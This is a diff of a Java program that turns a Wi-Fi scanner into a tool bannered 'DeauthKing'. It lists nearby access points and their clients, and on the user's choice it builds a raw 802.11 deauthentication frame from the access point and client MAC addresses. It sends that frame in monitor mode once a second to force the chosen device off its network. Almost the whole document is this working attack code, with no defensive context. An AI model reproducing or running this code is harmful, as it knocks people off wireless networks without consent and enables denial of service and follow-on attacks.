@@ -1,119 +1,143 @@
-// https://github.com/mgodave/Jpcap/tree/master/sample
-
+import org.pcap4j.core.*;
+import org.pcap4j.packet.UnknownPacket;
 import java.io.*;
-import java.net.ServerSocket;
-import java.util.ArrayList;
-import java.util.Collections;
-import java.util.List;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
+import java.util.*;
 
 class Main {
 
-    public static void main(String[] args) throws IOException, InterruptedException {
+    public static void main(String[] args) throws IOException {
 
-        String[] cmndBeacon = {"bash", "-c", "tcpdump -l -s0 -I -i en0 -e type mgt subtype beacon"};
-        List beaconLines = Collections.synchronizedList(new ArrayList<String>());
-        FetchTDData fetchBSSID = new FetchTDData(cmndBeacon, beaconLines);
-        (new Thread(fetchBSSID)).start();
+        UI ui = new UI();
+        (new Thread(ui)).start();
 
-        String[] cmndManagment = {"bash", "-c", "tcpdump -l -s0 -I -i en0 -e not type mgt subtype beacon"};
-        List managmentLines = Collections.synchronizedList(new ArrayList<String>());
-        FetchTDData fetchManagment = new FetchTDData(cmndManagment, managmentLines);
-        (new Thread(fetchManagment)).start();
+        List<Network> found = Collections.synchronizedList(new ArrayList<Network>());
+        final MessageCollector collector = new MessageCollector();
+        (new Thread(collector)).start();
 
-        System.out.println("Scanning networks (Please Wait)");
-        Thread.sleep(5000);
-        fetchManagment.killMe();
-        fetchBSSID.killMe();
+        ui.setDefault("" +
+                " _____                   _   _     _  ___             \n" +
+                "|  __ \\                 | | | |   | |/ (_)            \n" +
+                "| |  | | ___  __ _ _   _| |_| |__ | ' / _ _ __   __ _ \n" +
+                "| |  | |/ _ \\/ _` | | | | __| '_ \\|  < | | '_ \\ / _` |\n" +
+                "| |__| |  __/ (_| | |_| | |_| | | | . \\| | | | | (_| |\n" +
+                "|_____/ \\___|\\__,_|\\__,_|\\__|_| |_|_|\\_\\_|_| |_|\\__, |\n" +
+                "                                                 __/ |\n" +
+                "                                                |___/ \n" +
+                "\n");
 
-        List<Network> networks = new ArrayList<Network>();
-        for (Object line : beaconLines) {
-            Network currentNet = null;
-            currentNet = new Network(extractMac((String) line, "BSSID"));
-            currentNet.setName(extractBeacon((String) line));
-            if ((currentNet.getBssid() != null) && (currentNet.getName() != null) && !networks.contains(currentNet)) {
-                //currentNet.setName(netName);
-                networks.add(currentNet);
-                //System.out.println(currentNet.getBssid() + " " + currentNet.getName());
+        class updateUI extends TimerTask {
+            List<Network> found = null;
+            UI ui = null;
+
+            updateUI(List<Network> found, UI ui) {
+                this.found = found;
+                this.ui = ui;
             }
-        }
 
-        for (Object line : managmentLines) {
-            String da = extractMac(((String)line), "DA");
-            String sa = extractMac(((String)line), "SA");
-
-            //Add nodes
-            if (da != null && sa != null) {
-                boolean daExist = networks.contains(new Network(da));
-                boolean saExist = networks.contains(new Network(sa));
-
-                //SLOW SEARCH!
-                for (Network nw : networks) {
-                    if (nw.getBssid().equals(da) && !saExist && !nw.contains(new Node(sa)))
-                        nw.addNode(new Node(sa));
-                    if (nw.getBssid().equals(sa) && !daExist && !nw.contains(new Node(da)))
-                        nw.addNode(new Node(da));
-                }
-            }
-        }
-
-        for (Network nw : networks) {
-            System.out.println("+ " + nw.getBssid()  + " (" + nw.getName() + ")");
-            for (Node node : nw.getNodes()) {
-                System.out.println("    - " + node.getMac());
-            }
-        }
-
-        /*
-                String da = extractMac(tcpDump, "DA");
-                String sa = extractMac(tcpDump, "SA");
-
-                //Add nodes
-                if (da != null && sa != null) {
-                    boolean daExist = networks.contains(new Network(da));
-                    boolean saExist = networks.contains(new Network(sa));
-
-                    //SLOW SEARCH!
-                    for ( Network nw : networks) {
-                        if (nw.getBssid().equals(da) && !saExist && !nw.contains(new Node(sa)))
-                            nw.addNode(new Node(sa));
-                        if (nw.getBssid().equals(sa) && !daExist && !nw.contains(new Node(da)))
-                            nw.addNode(new Node(da));
+            public void run() {
+                synchronized (found) {
+                    found = collector.getNetworks();
+                    ui.clear();
+                    int count = 0;
+                    for (Network nw : found) {
+                        if (nw.getBssid() != null && nw.getName() != null) {
+                            count++;
+                            ui.printLine("["+count+"] " + nw.getBssidString() + " (" + nw.getName() + ")");
+                            for (Node nd : nw.getNodes()) {
+                                count++;
+                                ui.printLine("      [" + count + "] " + nd.getMacString() + " " +  ((nd.getSelected()) ? "<-- DEAUTHING" : ""));
+                            }
+                        }
                     }
                 }
-
-                /*
-                System.out.println("-----------------------------------");
-                for ( Network n : networks) {
-                    /*if (n.getNodes().size() < 1)
-                        break;
-
-                    System.out.println("+ " + n.getBssid() + " " + n.getName());
-                    for (Node nd : n.getNodes())
-                        System.out.println("    - " + nd.getMac());
-                }
-                System.out.println("-----------------------------------");*/
-
-    }
-
-    static public String extractMac(String line, String tag) {
-        return extract(line,String.format("\\W(%s:)((?i)..:..:..:..:..:..(?-i))\\W*", tag));
-    }
-
-    static public String extractBeacon(String line) {
-        return extract(line,String.format("\\W(Beacon )\\(((?i).*(?-i))\\)\\W*"));
-    }
-
-    static private String extract(String line, String crntPattern) {
-        String extracted = null;
-        Pattern pattern = Pattern.compile(crntPattern);
-        Matcher match = pattern.matcher(line);
-
-        if (match.find()) {
-            extracted = match.group(2);
+            }
         }
 
-        return extracted;
+        Timer t1 = new Timer();
+        t1.schedule(new updateUI(found, ui), 0, 1000);
+
+
+        for (String input = ui.getUserInput(); true; input = ui.getUserInput()) {
+
+            synchronized (found) {
+                try {
+                    if (input != "") {
+                        System.out.println("PRINTED: "+input);
+                        int selected = Integer.parseInt(input);
+                        int count = 0;
+                        for (Network nw : found) {
+                            //if(count == selected)
+                            //Death All In Net*/
+                            if (nw.getBssid() != null && nw.getName() != null) {
+                                count++;
+                                for (Node nd : nw.getNodes()) {
+                                    count++;
+                                    if (count == selected) {
+                                        nd.setSelected(true);
+                                        System.out.println("Selected: " + nd.getMacString() + " : " + nw.getBssidString());
+                                        deauth(nd.getMac(), nw.getBssid());
+                                    }
+                                }
+                            }
+                        }
+                    }
+                } catch (PcapNativeException e) {
+                    e.printStackTrace();
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                } catch (NotOpenException e) {
+                    e.printStackTrace();
+                } catch (NumberFormatException e) {
+                    ui.setStatus(input+" is not a number!");
+                }
+            }
+        }
+    }
+
+    private static void deauth(byte[] nodeMac, byte[] bssidMac) throws PcapNativeException, NotOpenException, InterruptedException {
+        PcapHandle.Builder bhndl = new PcapHandle.Builder("en0");
+        bhndl.rfmon(true);
+        bhndl.snaplen(65536);
+        bhndl.timeoutMillis(50);
+
+        PcapHandle hndl = bhndl.build();
+
+        byte[] data = {
+                (byte) 0x00, (byte) 0x00, (byte) 0x19, (byte) 0x00, (byte) 0x6f, (byte) 0x08, (byte) 0x00, (byte) 0x00,
+                (byte) 0xca, (byte) 0x20, (byte) 0xaa, (byte) 0xd4, (byte) 0x00, (byte) 0x00, (byte) 0x00,
+                (byte) 0x00, (byte) 0x10, (byte) 0x02, (byte) 0x9e, (byte) 0x09, (byte) 0x80, (byte) 0x04,
+                (byte) 0xd3, (byte) 0x9e, (byte) 0x00, (byte) 0xa0, (byte) 0x00, (byte) 0x3a, (byte) 0x01,
+                bssidMac[0], bssidMac[1], bssidMac[2], bssidMac[3], bssidMac[4], bssidMac[5], nodeMac[0],
+                nodeMac[1], nodeMac[2], nodeMac[3], nodeMac[4], nodeMac[5], (byte) 0x00, (byte) 0x00,
+                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0xd0, (byte) 0x02, (byte) 0x1C,
+                (byte) 0x00, (byte) 0x27, (byte) 0x8a, (byte) 0x60, (byte) 0x45
+        };
+        UnknownPacket packet = UnknownPacket.newPacket(data, 0, 55);
+
+        class deathUser extends TimerTask {
+
+            UnknownPacket packet = null;
+            PcapHandle hndl = null;
+
+            deathUser(UnknownPacket packet, PcapHandle hndl) {
+                this.packet = packet;
+                this.hndl = hndl;
+            }
+
+            @Override
+            public void run() {
+                try {
+                    hndl.sendPacket(packet);
+                    //Thread.sleep(500);
+                } catch (PcapNativeException e) {
+                    e.printStackTrace();
+                } catch (NotOpenException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+
+        Timer t1 = new Timer();
+        t1.schedule(new deathUser(packet, hndl), 0, 1000);
     }
 }
